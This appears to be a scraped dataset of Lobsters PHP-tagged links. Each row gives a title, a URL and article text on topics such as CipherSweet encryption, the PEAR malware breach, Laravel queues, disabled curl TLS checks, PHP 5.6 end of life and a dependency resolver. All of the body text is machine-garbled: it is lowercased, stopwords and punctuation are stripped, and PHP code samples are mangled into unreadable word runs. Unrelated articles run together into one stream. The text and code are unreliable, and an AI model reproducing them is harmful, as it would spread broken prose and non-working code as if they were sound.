invested ongoing research fully homomorphic encryption fhe allows database server perform calculation ciphertext return encrypted result application decrypt project eg encrypted camera app pixek much work seny kamara et al us technique called structured encryption accomplish encrypted search different threat model set operational requirement namely query tag encrypted clientside server act data mule additional power perform computation either case challenge proposed design must help user overcome used real world active cryptanalytic attack significant realworld deterrent adopting fully homomorphic encryption today performance cryptography implementation availability however savvy company also list third deterrent adaptive chosenciphertext attack controversial point raise significance depends application threat model application developer really trust database server lie application generally form active attack privileged omnipotent user eg root access database server root access client application software considered design kind encrypted search feature small input domain let say designing software hospital computer network need store protected health information possible input eg hiv status even encrypt data securely ie using aead without message length oracle system allows quickly search database specific value eg hiv positive introduces risk leaking information sidechannels information leakage search operation ripe oracle particular orderrevealing encryption technique leak plaintext similar block cipher ecb mode proposal searchable encryption must able account information leakage provide user simple way understanding managing risk ciphersweet highlevel overview brief introduction ciphersweet highlevel overview depth please refer official documentation github get ciphersweet ciphersweet available github installed via composer following command composer require paragonieciphersweet using ciphersweet first need backend handle cryptographic heavy lifting give two choose also backendinterface anyone ever need define fipscrypto us algorithm approved use fips note using backend nt automatically make application fips certified moderncrypto us libsodium generally recommended situation chosen backend done thinking cryptography algorithm nt need specify cipher mode hash function anything else instead next step decide want manage key addition generic option ciphersweet provides keyproviderinterface allow developer integrate custom key management solution finally need pas backend key provider engine point engine object need work directly together look like php use paragonieciphersweetbackendmoderncrypto use paragonieciphersweetkeyproviderstringprovider use paragonieciphersweetciphersweet first choose backend backend new moderncrypto next key provider provider new stringprovider key provider store backendinterface internal use backend example key chosen randomly hexencoded point forward need engine engine new ciphersweet provider working ciphersweet engine lot flexibility use following class mostly use following method prepareforstorage insert update query getallblindindexes getblindindex select query decrypt decryptrow decryptmanyrows decrypting select query encryptdecrypt apis named verbosely simply encrypt decrypt ensure intent communicated whenever developer work encryptedfield searchable encryption single column encryptedfield minimalistic interface encrypting single column database table encryptedfield designed project ever need encrypt single field still want able search value field php use paragonieciphersweetblindindex use paragonieciphersweetciphersweet use paragonieciphersweetencryptedfield use paragonieciphersweettransformationlastfourdigits var ciphersweet engine ssn new encryptedfield engine contact ssn addblindindex new blindindex contactssnfull addblindindex new blindindex contactssnlastfour new lastfourdigits encryptedrow searchable encryption many column one table encryptedrow powerful api operates row data time encryptedrow designed project encrypt multiple field andor wish create compound blind index also builtin handling integer floating point number nullable boolean value furthermore nt leak size stored value ciphertext length php use paragonieciphersweetciphersweet use paragonieciphersweetencryptedrow var ciphersweet engine row new encryptedrow engine contact addtextfield firstname addtextfield lastname addtextfield ssn addbooleanfield hivstatus addfloatfield latitude addfloatfield longitude addintegerfield birthyear encryptedrow expects array map column name value like php input contactid firstname jane lastname doe ssn hivstatus false latitude longitude birthyear extraneous true encryptedmultirows searchable encryption many table encryptedmultirows multirow abstraction designed make easier work heavilynormalized database integrate ciphersweet orms eg eloquent hood maintains internal array encryptedrow object one table feature encryptedrow provides also usable encryptedmultirows anyone familiar encryptedrow find api encryptedmultirows familiar php use paragonieciphersweetciphersweet use paragonieciphersweetencryptedmultirows var ciphersweet engine rowset new encryptedmultirows engine addtextfield contact firstname addtextfield contact lastname addtextfield contact ssn addbooleanfield contact hivstatus addfloatfield contact latitude addfloatfield contact longitude addintegerfield contact birthyear addtextfield foobar test encryptedrows expects array table name mapped array turn map column value like php input contact contactid firstname jane lastname doe ssn hivstatus null unknown latitude longitude birthyear extraneous true foobar foobarid contactid test paragonie ciphersweet usable cryptography win addition designed accordance cryptographically secure php best practice ciphersweet also carefully constructed userfriendly cryptographic api design decision feature lend towards hitting usable security goal blind index planning familiar blind index please read blog post detailing fundamental design blind indexing technique relatively straightforward information leakage profile since building block use keyed hash function eg key derivation function eg truncated used bloom filter make index output small incur performance penalty false positive make blind index almost pointless make index output large introduce risk creating unique fingerprint plaintext existence reliable fingerprint introduce risk known chosenplaintext attack however calculating safe output size blind index involves bit math generally given population p want sqrt p hash prefix collision call coincidence blind index output save developer time pencil paper math created planner class let figure many bit safely make blind index output pencil paper needed compound blind index compound blind index simply blind index created multiple field extremely useful want filter encrypted search result based boolean field without leaking boolean value directly index value broadly compound blind index give flexible way index common search criterion make lookup fast example using encryptedrow php use paragonieciphersweetciphersweet use paragonieciphersweettransformationalphacharactersonly use paragonieciphersweettransformationfirstcharacter use paragonieciphersweettransformationlowercase use paragonieciphersweettransformationlastfourdigits use paragonieciphersweetencryptedrow var encryptedrow row row addcompoundindex row createcompoundindex contactfirstinitlastname firstname lastname bit byte true addtransform firstname new alphacharactersonly addtransform firstname new lowercase addtransform firstname new firstcharacter addtransform lastname new alphacharactersonly addtransform lastname new lowercase give caseinsensitive index first initial last name builtin key separation information leakage especially harmful using key everywhere mitigate ciphersweet automatically derives distinct subkeys table column blind index using process called key hierarchy short keyprovider defines master key actual key used encrypting field derived use hkdf carefullychosen domain separation constant ensure crossprotocol attack possible key rotation need ever switch ciphersweet backends rotate key created specialpurpose suite php class facilitate lesspainful data migration reduce amount boilerplate code needed php use paragonieciphersweetciphersweet use paragonieciphersweetkeyrotationfieldrotator use paragonieciphersweetencryptedfield set var string ciphertext var ciphersweet old var ciphersweet new oldfield new encryptedfield old contact ssn newfield new encryptedfield new contact ssn rotator new fieldrotator oldfield newfield using rotator needsreencrypt ciphertext list ciphertext index rotator prepareforupdate ciphertext update row database learn various various migration feature upcoming development ciphersweet one item roadmap php security bring ciphersweet favorite framework little friction possible end releasing orm integration throughout starting eloquent doctrine additionally plan shipping keyprovider implementation integrate cloud km solution common hsm solution eg yubihsm standalone package extend core functionality ciphersweet allow business government office meet stringent security compliance requirement without polluting main library code tolerate oddlyspecific requirement development completed adopting searchable encryption php software painless possible finally want develop ciphersweet beyond php language want provide compatible implementation java c nodejs developer initial run although happy assist open source community developing auditing compatible library language honorable mention ryan littlefield already started early python implementation ciphersweet support development ciphersweet like support development effort please consider purchasing enterprise support contract company
95,Lobsters,php,PHP programming,"If you installed PEAR PHP in the last 6 months, you may be infected",https://arstechnica.com/information-technology/2019/01/pear-php-site-breach-lets-hackers-slip-malware-into-official-download/,installed pear php last month may infected,site blog result virustotal twitter available github pearwebphars infecting source backdoor infected million computer installed software update ccleaner infected medoc developer taxaccounting application widely used ukraine infection bank worldwide also two supplychain attack came light,official widely used php extension application repository temporarily shut website urging user inspect system discovering hacker replaced main package manager malicious one downloaded gopearphar package manager past six month get new copy release version github pearpearwebphars compare file hash official wrote site blog different may infected file official say hack web server occurred precisely malicious version gopearphar infected system initial indication however look serious starter advice applies anyone downloaded package manager past six month suggests hack may occurred timeframe last july one noticed either tainted download week result virustotal googleowned malware scanning service suggest malicious pear download installed backdoor possibly form web shell infected server true backdoor almost certainly give hacker complete ability install application execute malicious code download sensitive machine installed malicious download pear official respond question breach web server occurred malicious download twitter said gopearphar download available github affected hack also said updated pearwebphars download includes variety smaller file add gpg signature file phar file allow user easily verify authenticity individual pear component infecting source pear advisory latest expose known supplychain attack attack particularly effective single hack poison software source potentially large number people go get downloads bestknown example recent supply chain attack backdoor infected million computer installed software update ccleaner disk utility program hacker slipped backdoor update breaching ccleaner build system backdoor went undetected day virulent notpetya ransomware worm july also seeded attacker infected medoc developer taxaccounting application widely used ukraine attacker caused company update mechanism spread ransomware supplychain attack include infection bank worldwide also installed server networkmanagement product sold software maker netsarang last october two supplychain attack came light one affecting controlpanel interface vestacp official repository widely used python programming language one way reduce chance falling victim supplychain attack compare hash digest downloaded file hash published developer mean foolproof protection hacker ability alter installation file may also ability change published hash still remains effective many case particularly hash published wide number mirror site anyone installed pear installation file downloaded pearphpnet thoroughly analyze system sign infection await information pear official
96,Lobsters,php,PHP programming,Release of Deployer 6.4.0,https://github.com/deployphp/deployer/releases/tag/v6.4.0,release deployer,added changed fixed reload reload,added support define remote shell path via hostconfig added horizon terminate laravel recipe added migrationsconfig option symfony recipe specify doctrine migration configuration use added recipe sulu added recipe sulu improve sulu recipe added become option rsync upload changed laravel recipe run artisan cache clear deploy task passthrough quiet mode git command updating code deploy writable longer able automatically detect httpuser multiple candidate role fixed fixed range expansion hostsyml loaded fixed usage present deploypath config setting fixed adding custom header cause httpie default header override fixed laravel laravelversion failure fixed parser error adding trim function changelog parser token fixed argument rsync properly escaped prevent multiple execution task parallel limit option perform action time signed another tab window reload refresh session signed another tab window reload refresh session
97,Lobsters,php,PHP programming,Postmill,https://gitlab.com/edgyemma/Postmill,postmill,,
98,Lobsters,php,PHP programming,PHP was never meant to die,https://blog.spiralscout.com/php-was-never-meant-to-die-830de87915ee,php never meant die,software development blog spiral scout,software development blog spiral scouthelping business build web mobile development team offshoring
100,Lobsters,php,PHP programming,PHP 7.3 Released,http://php.net/downloads.php,php released,,sec sc expires uid ultimate derick rethans gpg derickrethansnl uid ultimate derick rethans derick derickrethansnl uid ultimate derick rethans github github derickrethansnl uid ultimate derick rethans php derick phpnet ssb e expires pub sc expires uid ultimate peter kokot petk phpnet sub e expires pub sc expires key fingerprint cbaf uid christoph becker cmb phpnet pub key fingerprint uid stanislav malyshev php key smalyshev gmailcom uid stanislav malyshev php key stas phpnet uid stanislav malyshev php key smalyshev sugarcrmcom pub expires key fingerprint dbdb uid sara golemon pollita phpnet pub expires key fingerprint uid remi collet remi phpnet pub sc expires key fingerprint cbaf uid christoph becker cmb phpnet
101,Lobsters,php,PHP programming,PHP WASM extension now supports imported functions from Rust/C/Go,https://twitter.com/mnt_io/status/1070091896985436160?s=19,php wasm extension support imported function rustcgo,,detected javascript disabled browser would like proceed legacy twitter yes
102,Lobsters,php,PHP programming,Going Frameworkless,https://www.detassigny.net/posts/2/going-frameworkless,going frameworkless,mediumcom php meetup composer package doctrine twig fastroute phpdotenv write v borrow container interface performance writing framework learned feel free,year ago decided wanted start tech blog point started head long internal debate use write blog follow today trend use mediumcom selfhost wordpress blog thinking also realised nt side project work moment might well write blog came decision language framework use ruby rail php symfony laravel new trendy language thinking remembered php meetup went dublin one member talked writing php application without framework write blog php framework option probably chose longest implement end nt regret story going frameworkless think every php developer perhaps devs try least composer package first nt exactly write everything scratch sure would option well masochist instead used composer package handle specific task nt want implement doctrine used managing entity db persistency twig frontend fastroute request routing phpdotenv managing env variable one end spent good amount time writing glue various package chose write v borrow think general advice would give write want write use package anything else nt really feel like implementing instance wrote container manage dependency could used existing package felt interested writing implementation container interface implementation probably worse package still proud anyway believe lot fun writing reason wondering would go writing db persistency layer go ahead definitely learn lot first probably biggest reason would advise going frameworkless opportunity write code would never write otherwise performance one reason might want avoid using framework could performance really nt looked much writing blog honest probably could spend time optimising however end mostly code wrote least specific package cherry picked mean know expect nt big overhead whole framework could introduce writing framework ever think writing framework decide go frameworkless ask question end actually end writing one might actually really like way glued piece necessary applicationblogwebsite try make separate framework nt gone far yet probably never definitely time least considered code write definitely piece look shaped like beginning framework met developer attempted write framework truly believe would best way need pet project determine framework would look like learned clear really like framework let write project scaffolding already place good one usually well documented saying stop using completely however learning experience really make think try using one gave chance write lot php code discover specific package specific task eg routing usually included framework never chance discover fastroute also simply fun nt think would enjoyed much creating medium account installing wordpress developing blog laravel would okay blog nt complicated would done quite quickly instead spent time thinking implement specific part system container behaves way would expect handle error etc would final reason going frameworkless side project ever moment wanted work programming side project nt new exciting idea well maybe could one write simple site application without framework guarantee challenge fun interested look source code blog feel free
103,Lobsters,php,PHP programming,How my personal Bug Bounty Program turned into a Free Security Audit for the Serendipity Blog,https://blog.hboeck.de/archives/896-How-my-personal-Bug-Bounty-Program-turned-into-a-Free-Security-Audit-for-the-Serendipity-Blog.html,personal bug bounty program turned free security audit serendipity blog,people serendipity open redirect x start page x back end sql injection back end another sql injection freetag plugin serendipity version welcome report,hackerone currently one popular bug bounty program platform usual provider bug bounty program company w ago noted people running bug bounty program hacker one private project without payouts made curious decided start one private web page scope hackerone process requires program private first starting limited number invite soon started program first report came surprisingly got plenty false positive tried limit documenting scope better program description also got plenty web security scanner payload via contact form surprise also got number high quality report blog two site scope use serendipity also called blog software written php bug bounty program got report open redirect x start page x back end sql injection back end another sql injection freetag plugin legitimate vulnerability serendipity quite severe forwarded report serendipity developer fix available first round fix released serendipity another issue got fixed freetag plugin updated version use serendipity please make sure run latest version always happy way bug bounty platform work yet seems attracted active community security researcher also willing occasionally look project without financial reward questionable large corporation run bug bounty program without reward think totally fine private project volunteerrun free open source project conclusion take likely project try make use bug bounty community essentially serendipity got free security audit secure got indirection personal bug bounty program course could also work directly free software project could start bug bounty program web application ideally live installation product scope case find security issue web page welcome report special thanks brian carpenter geeknik julio cesar oreamnos making blog secure
104,Lobsters,php,PHP programming,How to size & scale your Laravel Queues,https://ohdear.app/blog/how-to-size-scale-your-laravel-queues,size scale laravel queue,laravel queue getting started queue fifo fast v slow job certificate check uptime check singlepurpose queue notification webhooks monthly uptime reporting ondemand queue better ux api conclusion,laravel offer convenient way create asynchronous background task using queue utilize heavily oh dear monitoring job post share lesson learned consider best practice getting started queue basic example find similar push job onto queue worker pick processing job dispatch onqueue general whatever job wanted queue pushed queue named general every job add queue added fifo processed order great way start quickly run queue potentially look like job job job job job assuming one worker pick job queue job would wait second former job completed get turn adding multiple worker queue speed thing still potential blocking long running task ideally want split fast v slow job one strategy first used make generic seperation fast slow job remember purpose oh dear monitoring site crawling reporting page error etc quickly becomes apparent heavily dependent party site monitoring quick crawl might take minute slow site apply rate limiting might take long time consume resource along way slow u mean remote side slow also mean wasting cpu cycle waiting end respond could easily spin worker parallel since load negligable end first ended queueing system similar fast worker worker worker slow worker worker worker worker worker result fast queue consumed cpu memory end quickly burned queue performing fast task checking uptime certificate check etc slow queue running consumer aka worker constrained remote end meant could easily run worked first week beta customer base grew also posed problem fast queue generally pretty fast pushing lot different workload uptimechecker dispatch onqueue fast certificatechecker dispatch onqueue fast certificate check take bit longer complete uptime check arguably uptime check important certificate check needed better solution singlepurpose queue nt take long u create specific queue job type launching setup check performed life queue allows u great deal flexibility term sizing scaling run specific job queue main application run following queue certificatehealth certificatetransparency crawler uptime queue run monitoring check site top assisting queue default notification webhooks notification webhooks pretty selfexplanatory run notification slackdiscordnexmo perform webhook call party endpoint default queue used small oneoff job small queue like sending mail like monthly uptime reporting special queue ondemand queue better ux add site monitored initial experience look like user experience want immediate feedback feeling responsiveness add site certificate uptime check happen nearinstantly broken link checking take bit longer site need crawled make work push site added empty queue custom set worker immediately pick uptimechecker dispatch onqueue ondemandrunsshort certificatechecker dispatch onqueue ondemandrunsshort crawlerchecker dispatch onqueue ondemandrunslong nt take approach first meant queue ended like uptime worker job job job certificate worker job job job job job added new site added back queue wait job complete first initial user experience gave impression slow unresponsive took long feedback ui first tried get away adding front queue instead back nt entirely work either reason uptime check took second finish current job still wait new priority job picked since monitor crawl site nt control idea long check might take need assume worst case plan ondemand run pick site added job user requested run ondemand trigger either oh dear dashboard api ever reach point detect saturation ie queue never empty split queue separate initial run v ondemand run conclusion iterated version ultimately settled setup work great u use case may vary key takeaway queue per type job size amount worker slow v fast workload separate queue task need give quick uiux feedback user got laravel queue related tip would love hear
105,Lobsters,php,PHP programming,Many CMS plugins are disabling TLS certificate validation... and that's very bad,https://www.zdnet.com/article/many-cms-plugins-are-disabling-tls-certificate-validation-and-thats-very-bad/,many cm plugins disabling tl certificate validation bad,dennis nicolai andersen zdnet additional edits curl devs disabling two important curl security setting purpose first second hundred wordpress plugins simple fix available report reddit discussion certainty company github account related coverage,dennis nicolai andersen zdnet additional edits absurd number cm plugins php library disabling ssltls certificate validation purpose putting million internet user great riskto make matter worse many plugins library used establish connection payment provider server connection later transmit sensitive user data handle financial transactionsthis important yet lesser known security issue discovered brought zdnet attention scott arciszewski chief development officer paragon initiative enterprise issue resides author cm plugins php library configuring code specifically curl optionscurl commandline utility found web hosting server used transferring data remote server curl use ubiquitous web development community many cm plugins php library use download send upload data remote server via server underlying console instead opening actual browser session connectioncurl support bunch protocol opening connection via http ftp smtp ldap morefor example wordpress plugin handle financial transaction payment process us curl connection background actually upload sensitive credit card data payment provider server usually happens via curl connection set via http curl also handle ssltls certificate validation crucial step making sure talking legitimate http server arciszewski recently discovered developer many cm plugins php library disabling curl security feature curl used download send data via http connection like one abovethis huge issue especially case curl used handle financial transaction sensitive user datahaving connection negotiated via weakened http connection disaster waiting happen allow attacker easily trick website downloading sending legitimate data malicious server two feature originating site nt trigger alert either user site ownersmost devs disabling two important curl security settingsaccording arciszewski happens two curl setting developer cm plugins php library disable purposethe first curloptsslverifyhost many plugins library set false instead true setting mean curl wo nt verify host url connecting download upload data long remote server valid certificate signed random certificate authority let encrypt comodo server url legitimatesitecom malicioussitecom website curl request originates wo nt carethe second curl setting many developer disabling curloptsslverifypeer many devs setting instead secure valuethis setting mean website accept connection random http server even use selfsigned certificate expose extremely trivial maninthemiddle attack arciszewski said report published last weekthis small issue ignored problem extremely widespread php community especiallya cursory github search first second setting reveals hundred thousand project developer disabling curl certificate validation including hundred wordpress plugins simple fix availablebut arciszewski typical security expert point issue fearmonger way reputation also offer simple solutionas arciszewski pointed recent report php community confirmed reddit discussion week main reason many project disabling two curl feature enabled tend generate scary securityrelated error customer server order avoid alarming customer developer opt turn two feature unwittingly knowing really doingthe reason error arciszewski explains curl need verify certificate remote http server list known valid ssltls certificatesthis list authentic certificate authority organization allowed issue ssltls cert available download many placesunfortunately web hosting service nt store list many store different server location making impossible configure curl setting cm plugins php library universal manner work seamlessly serversto address issue arciszewski created custom php library named certainty download file cacertpem curl homepage regular interval host locally ensuring website always uptodate list valid certificate authoritiescms plugin php library owner include library project enable two curl setting project without worry triggering scare security alert afterwardsure insecure setting inside library inside another library might sound like insignificant matter insecure setting used hundred thousand project insignificant matter becomes internetwide problem fixing might require something simple releasing better toolsarciszewski company paragonie known releasing better tool past year opensourced available company github accountrelated coverage
106,Lobsters,php,PHP programming,Around 62% of all Internet sites will run an unsupported PHP version in 10 weeks,https://www.zdnet.com/article/around-62-of-all-internet-sites-will-run-an-unsupported-php-version-in-10-weeks/,around internet site run unsupported php version week,paragon initiative enterprise widely used php version eol date end ticking php time bomb made official step joomla minimum requirement wordpress minimum requirement defiant note wordpress notification also almost half cyberattacks directed smbs stay safe techrepublic related coverage,according statistic roughly percent internet site today run php december security support php officially cease marking end support version ancient php branchthis mean starting next year around percent internet site still running php version stop receiving security update server website underlying technology exposing hundred million website serious security risksif hacker find vulnerability php new year lot site user would risk huge problem php ecosystem scott arciszewski chief development officer paragon initiative enterprise told zdnet interview many feel get away running php simplest way describe choice negligent totally fair likely major massexploitable flaw php would also affect newer version php arciszewski added php get patch php team free timely manner php get one paying ongoing support o vendor anyone find running php end year ask feel lucky sure would nt php community known deadline quite php became widely used php version back spring php maintainer realized would disaster stopped security update right php became popular php version extended eol date end several developer security researcher warned ticking php time bomb although many infosec community would wishedthere concerted effort get people move newer php website content management system cm project one one started modifying minimum requirement warning user use modern hosting environmentsof big three wordpress joomla drupal drupal made official step adjust minimum requirement php move come march ironically branch reached eol december nt actually solve anything still step forwardjoomla minimum requirement remains php wordpress minimum requirement remains php biggest source inertia php ecosystem regarding version undoubtedly wordpress still refuse drop support php zero system universe still run wordpress ancient unsupported version php arciszewski said describing wordpress team infamous strongheadedness keeping minimum requirement php version went eol used quarter site internet would without doubt shift lot people view necessity using modern php version project would move minimum php requirement newer php branch php version supported wordpress however major debate time said sean murphy director threat intelligence defiant company behind wordfence security plugin wordpress email exchange zdnet ongoing initiative wordpress team notify user using legacy version php give information tool need request newer version hosting provider added note team recent meeting murphy belief one biggest challenge rolling php version upgrade large number site flood support request come result reason many cm project web hosting provider reticent unwilling sobut murphy also point good hosting provider always deploy new user new version php default instead letting customer choose update existing client new version php requestedbut unless customer aware version php reached endoflife ask moved newer version wordpress notification user running site outdated php version come help making people either update server ask hosting provider modern hosting environmentwhile wordpress security expert alarmed impending eol php branch entire php indirectly murphy one php vulnerability would indeed bad nt know recent history said based past php vulnerability threat mostly php application murphy added suggesting attacker would likely continue focus php library cm systemsalso almost half cyberattacks directed smbs stay safe techrepublicbut share murphy opinion example arciszewski belief php older branch prodded new vulnerability usual branch eol insanely popular unsupported perfect condition plentiful target bad security draw attacker yes absolutely risk factor arciszewski said saw something similar happen window xp support dropped suspect see happen php branch maybe necessary catalyst company take php adoption seriously hope server administrator website owner need convincing end article ending martin wheatley used ticking php time bomb piece summeryes cost time money worse small monthly support fee headline site hacked thousand user detail stolen followed fine million euro turnover gdpr know rather pay related coverage
107,Lobsters,php,PHP programming,PHP 8 (Roadmap),https://externals.io/message/102415,php roadmap,,thanks taking time respond pushing mean going rush deprecation already firehose mode lastminute underplanned hey want toy request yes deprecation little bit sweaty ice cube term late deprecation lower risk late addition still turning rushed thing season folk holiday break ff summer part bad time introduce rfcs note propose actually thin depredationsonly php give credit credit due dmitry idea give u ample time without rush deprecation several thesis case talking something even fully scoped yet async example requires lot research yes research probably completed turned implementation year till nov ga whatever version end multiple item list seemingly fully fleshed think entirely unreaslitic remarkably optimistic prefer think done month still ton work want jit front work entirely ahead u far async preloading concerned without even factoring amount time discussion would take fact likely still busy quite time releasing end effectively mean squeeze huge version timeline took incredibly smaller version like think good good also nt think anything sacred releasing end particular year read phrase like open door new type workload php non web one key reason node gaining popularity bleeding edge technology ai machine learning smell trend chasing new hotness worrying factor making php best language web growing php great evolving new area also potentially quite good history showing happens come something new chase turn underwhelming undermaintained underutilized also seen jit term additional complexity pretty first admit definitely happening paraphrase daughter nt start word people actively looking way run php nodelike manner shift towards microservices nt think fad think need go stay relevant jit bit mixed bag many effort went managed get something pretty nice going also bit solution looking problem idea expanding php area came perfectly honest invented approach either people using php nonweb workload since forever plus still hopeful would show benefit web world especially conjunction preloading fact enable phpbased builtin function another thing wanted long time ffi think risk low potential benefit substantial major idea probably one mentally least attached see downside body swap quite full turnabout suddenly flashback give language rest people evolve please nt construe response entirely negative said reply actually quite excited new thing direction open may dimitri spending quite lot time thinking implication language going forward however like ng branch prior appears lack sort plan u private email thread yes discussed one point another apart jit obvious sign work brings back concerned suddenly flagged last release within mere day planned feature freeze branch date without warning taking comment negatively want point time around everything done public much could including jit ffi nt meaningful progress beyond conferencestyle brainstorming regarding preloading async virtually work ahead u sound like messy kind lot planforaplan actual plan main goal gauge level willingness people say php going next feature release php allocate longer timeline u successfully deliver standard yearly cadence pretty much always case major version course discus every one idea separately course theory possible shoot different idea least hopeful would nt case enough material idea perhaps others release major version within year possible alternative still aim nov ga parallel sort happened released know quite would give u couple advantage take time lastminute deprecate thing rfcs suddenly popped escape hatch delay till nov implementation big stuff nt quite ready whatever reason rather forced push still think dmitry idea deprecationonly sometime make sense really wanted could make deprecationsome extra version concerned fragmenting scarce resource nt think sky fall case take month last feature release think worked pretty well thanks feedback zeev
110,Lobsters,php,PHP programming,Dependency Resolving Algorithm,https://www.photogabble.co.uk/blog/programming/dependency-resolving-algorithm/,dependency resolving algorithm,tapestry paper ferry boender github project boilerplate git commit representing data resolving dependency raise issue repository testing dependency resolution keeping adjacency list testing adjacency list generation writing adjacency list graphresolver trimming changed file github,writing version two static site generator tapestry begun researching various data structure complementary algorithm would aid optimising build process improve tapestry build project would need utilise dependency resolution abstract syntax tree starting dependency resolution admittedly quick google search ended reading paper ferry boender authored titled blog post aside well written ferry paper explains detail dependency resolving algorithm function article documenting detail implementation ferry dependency resolving algorithm within tapestry debugging tool wrote aid visualising generated graph use mock project source code open source available github project boilerplate begin set basic project directory structure shown following along obtain folder state git commit photogabbledependencygraph gitignore composerjson phpunitxml test graphtestphp src nodephp may seem like lot boilerplate eventually become handful class starting test framework standard directory layout make easier development especially test driven development representing data see diagram graph simple data structure consist node circle labeled e connected one another via edge arrow node store edge reference mean simple class php needed define one php namespace photogabbledependencygraph class node var string name node public name var node array edge node public edge public function construct string name name name public function addedge node node arraypush edge node see node class defined srcnodephp weighs loc somewhat helped use public property lack meta data however basic implementation complete resolving dependency order resolve dependency function need walk graph starting root node following node defined edge doubling back recording path taken diagram graph resolver function would walk b b e returning b would walk b c c returning c b finally walking returning result result output e c e b duplicate removed boil e c b say must parsed b b c resolving dependency way useful tapestry order identify execute generator efficient manor possible packaged described functionality class called graphresolver creating file srcgraphresolverphp following content php namespace photogabbledependencygraph class graphresolver private resolved private unresolved public function resolve node node array resolved unresolved resolvenode node return resolved private function resolvenode node node arraypush unresolved node foreach node edge edge inarray edge resolved inarray edge unresolved throw new exception circular reference detected node name edge name resolvenode edge arraypush resolved node key arraysearch node unresolved false unset unresolved key code within resolvenode method almost direct port php python code ferry wrote article happen know better way could ported please raise issue repository would like make example best available testing dependency resolution everything set next step write couple test check firstly graph resolver working expected secondly exception thrown upon circular dependency detected done adding following content testsgraphtestphp php namespace photogabbletests use photogabbledependencygraphgraphresolver use photogabbledependencygraphnode class graphtest extends phpunitframeworktestcase public function testgraphresolver var node node node foreach range e letter node letter new node letter node addedge node b b depends node addedge node depends node b addedge node c c depends b node b addedge node e e depends b node c addedge node depends c node c addedge node e e depends c class new graphresolver result class resolve node assertsame e c b arraymap function node v return v name result public function testgraphresolvercirculardetection var node node node foreach range e letter node letter new node letter node addedge node b b depends node addedge node depends node b addedge node c c depends b node b addedge node e e depends b node c addedge node depends c node c addedge node e e depends c node addedge node b b depends circular class new graphresolver expectexceptionmessage circular reference detected b class resolve node keeping adjacency list given porting known working example tested original output nt anything special functioning box ticking exercise code coverage however tapestry simply need resolve order dependency parsed also need able identify parsed latter functionality useful cache invalidation example given graph b node changed since previous run need recompiled depend b one way another representing example graph adjacency list make clear many dependent node file would need compiled ancestor modified example looking know e modified node would need compiled b modified three node would need also compiled graph e c b b e c c e e testing adjacency list generation spirit tdd known graph output result code written generate adjacency list following test added testsgraphtestphp public function testgraphadjacencylist var node node node foreach range e letter node letter new node letter node addedge node b b depends node addedge node depends node b addedge node c c depends b node b addedge node e e depends b node c addedge node depends c node c addedge node e e depends c class new graphresolver class resolve node assertsame e c b b e c c e e arraymap function array v return arraymap function node n return n name v class getadjacencylist writing adjacency list graphresolver order generate adjacency list pas new testgraphadjacencylist test graphresolver class need modified surprisingly small way adding fourteen line code update adjacencylist array node graph resolve class graphresolver private adjacencylist public function resolve node node array resolved unresolved adjacencylist resolvenode node return resolved public function getadjacencylist return adjacencylist private function resolvenode node node parent isset adjacencylist node name adjacencylist node name arraypush unresolved node foreach node edge edge inarray edge resolved inarray edge unresolved throw new exception circular reference detected node name edge name arraypush parent node resolvenode edge parent foreach parent p node name p name inarray node adjacencylist p name arraypush adjacencylist p name node arraypush resolved node key arraysearch node unresolved false unset unresolved key scanning adjacencylist able easily tell line added previous version graphresolver shall skip ahead explaining change resolvenode method work node name property nt already exist key adjacencylist added line next node edge resolved line loop node parent look adjacencylist using parent name key push current node value look simple cheating using recursive nature resolvenode method essentially logging resolution path resolve art programming test passing continue onto trimming changed node trimming changed file keep demonstration simple opted add changed flag node adding public property changed setting value construct class node public changed public function construct string name bool changed false name name changed changed next spirit tdd wrote following test method testsgraphtestphp public function testgraphreduction var node node node foreach range f letter node letter new node letter node c changed true node addedge node b b depends node addedge node depends node b addedge node c c depends b node b addedge node e e depends b node c addedge node depends c node c addedge node e e depends c class new graphresolver class resolve node reduced class reduce assertcount reduced assertsame node c node node e reduced node e addedge node f f depends e class new graphresolver class resolve node reduced class reduce assertcount reduced assertsame node c node node f node e reduced test asserts graphresolver resolved node list test running yettobewritten reduce method resulting array contain three element equal c e followed modifying node list node f depending e rerunning resolve reduce method assert resulting array containing four element equal c f e easy see expected result put visualisation generated graphviz test obviously fail ran reduce method yet exist graphresolver class public function reduce array modified foreach resolved node node changed true arraypush modified node foreach adjacencylist node name affected arraypush modified affected return modified reading boender paper dependency resolving algorithm subject felt quite daunting complexity however feeling loc written unit test le equal code tested therefore fair say fear unfounded amount complexity implementation surprisingly minimal easily understood spending minute walking execution would like review code commentsuggestion whole lot available github much welcome suggestion improved
111,Lobsters,php,PHP programming,Strategies for dealing with poor code in limited time,https://chrismm.com/blog/strategies-for-dealing-with-poor-code-in-limited-time/,strategy dealing poor code limited time,understanding poor code quickly valuable skill help become productive short time reduce stress usually come new guy play catchup prime opportunity showing client bos skill ask help many case original developer made strange unexpected decision make list new concept poorly named element lead great confusion document early make easy reproduce bug adding code versioning virtual machine docker vagrant greatly reduce time take reproduce bug test work new feature,given task implementing new feature old codebase code look awful understand quickly possible several shortcut help learn important part new code without getting lost irrelevant detailsas programmer often join new project quality code place even organized team keeping code quality consistent throughout mediumsizetolarge project challengethat understanding poor code quickly valuable skill help become productive short time reduce stress usually come new guy play catchup conversation coworker knowing person talking half time terrible feelingon hand prime opportunity showing client bos skill get speed quickly impress developer take week month become really productive codebase build themselvesask helpother people already learned code work ask might think make look like newbie showing curiosity strong impact image employee bos expectation get productive fast without asking question misjudgment parteveryone take time get speed ask question impress people right attitude teamworkin many case original developer made strange unexpected decision talking code much valuable reading even case documentation lacking remember existing developer valuable project knowledge written anywheremake list new conceptsthere might business concept new overly complex important get clarification trying work code handle concept avoid misunderstanding might take figure outit might even case idea mislabeled represented unexpected way database avoid getting stressed wrapping brain around go source ask coworkers itin vein might module class entity appropriate name make note poorly named element lead great confusion document early well anything else negatively affect ability think code worksmake easy reproduce bugsby adding code versioning virtual machine docker vagrant greatly reduce time take reproduce bug test work new featureany kind misunderstanding code work could lead path building wrong thing either building might already seen thing work way thoughtat point want git version control project way able go back stable release even work separate branch discarded neededit even possible gain greater reproducibility git since use stash add testing debugging code dig hardtotrack problem
